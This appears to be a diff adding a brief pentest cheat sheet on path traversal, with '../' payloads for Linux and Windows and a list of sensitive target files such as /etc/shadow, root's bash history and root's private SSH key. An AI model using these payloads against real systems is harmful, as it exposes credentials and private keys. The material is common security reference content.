@@ -1,0 +1,24 @@
+Path traversal 
+ Linux
+../../../etc/passwd
+
+Windows
+../../../../boot.ini
+../../../../windows/win.ini
+
+
+OS files
+
+/etc/issue - contains a message or system identification to be printed before the login prompt.
+
+/etc/passwd - has all registered user that has access to a system.
+
+/etc/shadow - contains information about users' passwords
+
+/root/.bash_history - contains the history commands for root user
+
+/root/.ssh/id_rsa - private ssh keys for a root or known valid user on the server
+
+c:\boot.ini - contains boot options for computers with BIOS firmware
+
+
